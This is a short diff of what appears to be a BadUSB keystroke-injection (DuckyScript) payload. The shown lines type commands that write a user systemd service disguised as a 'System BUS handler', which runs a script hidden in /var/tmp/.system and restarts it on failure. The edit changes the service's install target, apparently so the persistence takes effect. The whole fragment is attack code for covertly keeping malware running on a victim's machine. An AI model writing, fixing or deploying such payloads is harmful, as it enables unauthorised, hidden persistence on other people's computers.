@@ -29,7 +29,7 @@ REM [creating non-root systemd service]
 STRING mkdir -p ~/.config/systemd/user
 ENTER
 DELAY 100
-STRING echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=multi-user.target" > ~/.config/systemd/user/systemBUS.service
+STRING echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
 ENTER
 DELAY 100
 
